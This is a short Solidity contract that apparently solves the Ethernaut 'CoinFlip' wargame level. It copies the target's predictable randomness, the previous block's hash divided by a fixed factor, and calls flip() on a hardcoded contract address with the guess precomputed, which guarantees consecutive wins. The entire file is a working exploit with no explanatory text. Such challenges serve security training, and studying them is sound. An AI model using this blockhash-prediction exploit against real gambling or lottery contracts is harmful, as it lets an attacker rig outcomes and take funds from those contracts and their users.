// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlip {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlipContract = ICoinFlip(address(0x3a0F3d022905f192b5b0aF992EE0C92af7273EaC));

    function flipCoin() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }

    function getConsecutiveWins() public view returns (uint256) {
        return coinFlipContract.consecutiveWins();
    }
}

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}
